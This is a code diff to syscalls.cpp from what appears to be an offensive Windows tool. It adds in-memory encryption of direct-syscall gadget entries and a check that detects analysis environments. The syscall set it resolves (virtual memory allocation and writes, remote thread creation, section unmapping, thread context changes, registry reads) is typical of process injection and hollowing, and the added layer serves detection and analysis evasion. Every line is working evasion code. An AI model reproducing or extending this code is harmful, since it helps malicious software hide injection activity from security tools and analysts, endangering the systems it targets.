@@ -1,8 +1,9 @@
 // syscalls.cpp
-// v0.15.0 (c) Alexander 'xaitax' Hagenah
+// v0.16.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include "syscalls.h"
+#include "syscalls_obfuscation.h"
 #include <vector>
 #include <string>
 #include <algorithm>
@@ -14,6 +15,15 @@
 #include <functional>
 
 SYSCALL_STUBS g_syscall_stubs{};
+static bool g_obfuscation_enabled = false;
+
+struct ObfuscatedSyscallStorage
+{
+    SyscallObfuscation::ObfuscatedSyscallEntry entries[19];
+    UINT argCounts[19];
+};
+
+static ObfuscatedSyscallStorage g_encrypted_storage{};
 
 static bool g_verbose_syscalls = false;
 static void debug_print(const std::string &msg)
@@ -80,9 +90,26 @@ namespace
     }
 }
 
-BOOL InitializeSyscalls(bool is_verbose)
+BOOL InitializeSyscalls(bool is_verbose, bool enable_obfuscation)
 {
     g_verbose_syscalls = is_verbose;
+    g_obfuscation_enabled = enable_obfuscation;
+
+    if (g_obfuscation_enabled)
+    {
+        if (!SyscallObfuscation::InitializeObfuscation(true))
+        {
+            debug_print("WARNING: Obfuscation initialization failed, continuing without obfuscation");
+            g_obfuscation_enabled = false;
+        }
+        else
+        {
+            if (SyscallObfuscation::g_Obfuscator && !SyscallObfuscation::g_Obfuscator->ValidateEnvironment())
+            {
+                debug_print("WARNING: Analysis environment detected! Obfuscation may be compromised");
+            }
+        }
+    }
 
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll)
@@ -140,6 +167,9 @@ BOOL InitializeSyscalls(bool is_verbose)
         {"ZwQueryValueKey", {&g_syscall_stubs.NtQueryValueKey, 6}},
         {"ZwEnumerateKey", {&g_syscall_stubs.NtEnumerateKey, 6}}};
 
+    std::map<const char *, int, CStringComparer> syscall_indices = {
+        {"ZwAllocateVirtualMemory", 0}, {"ZwWriteVirtualMemory", 1}, {"ZwReadVirtualMemory", 2}, {"ZwCreateThreadEx", 3}, {"ZwFreeVirtualMemory", 4}, {"ZwProtectVirtualMemory", 5}, {"ZwOpenProcess", 6}, {"ZwGetNextProcess", 7}, {"ZwTerminateProcess", 8}, {"ZwQueryInformationProcess", 9}, {"ZwUnmapViewOfSection", 10}, {"ZwGetContextThread", 11}, {"ZwSetContextThread", 12}, {"ZwResumeThread", 13}, {"ZwFlushInstructionCache", 14}, {"ZwClose", 15}, {"ZwOpenKey", 16}, {"ZwQueryValueKey", 17}, {"ZwEnumerateKey", 18}};
+
     for (WORD i = 0; i < sortedSyscalls.size(); ++i)
     {
         const auto &mapping = sortedSyscalls[i];
@@ -158,6 +188,17 @@ BOOL InitializeSyscalls(bool is_verbose)
 
         if (pGadget)
         {
+            if (g_obfuscation_enabled && SyscallObfuscation::g_Obfuscator)
+            {
+                auto idx_it = syscall_indices.find(mapping.szName);
+                if (idx_it != syscall_indices.end())
+                {
+                    int idx = idx_it->second;
+                    g_encrypted_storage.entries[idx] = SyscallObfuscation::g_Obfuscator->EncryptEntry(pGadget, i);
+                    g_encrypted_storage.argCounts[idx] = it->second.second;
+                }
+            }
+
             it->second.first->pSyscallGadget = pGadget;
             it->second.first->nArgs = it->second.second;
             it->second.first->ssn = i;
@@ -176,15 +217,13 @@ BOOL InitializeSyscalls(bool is_verbose)
 
     if (all_found)
     {
-        int regSyscalls = 0;
-        if (g_syscall_stubs.NtOpenKey.pSyscallGadget)
-            regSyscalls++;
-        if (g_syscall_stubs.NtQueryValueKey.pSyscallGadget)
-            regSyscalls++;
-        if (g_syscall_stubs.NtEnumerateKey.pSyscallGadget)
-            regSyscalls++;
+        debug_print("Initialized " + std::to_string(required_syscalls.size()) + " syscall stubs" +
+                    (g_obfuscation_enabled ? " (with obfuscation)." : "."));
 
-        debug_print("Initialized " + std::to_string(required_syscalls.size()) + " syscall stubs.");
+        if (g_obfuscation_enabled && SyscallObfuscation::g_Obfuscator)
+        {
+            debug_print("Obfuscation layer active - syscalls encrypted in memory");
+        }
 
         for (const auto &pair : required_syscalls)
         {
@@ -298,7 +337,6 @@ NTSTATUS NtQueryValueKey_syscall(HANDLE KeyHandle, PUNICODE_STRING_SYSCALLS Valu
 {
     return (NTSTATUS)SyscallTrampoline(&g_syscall_stubs.NtQueryValueKey, KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
 }
-
 NTSTATUS NtEnumerateKey_syscall(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
 {
     return (NTSTATUS)SyscallTrampoline(&g_syscall_stubs.NtEnumerateKey, KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
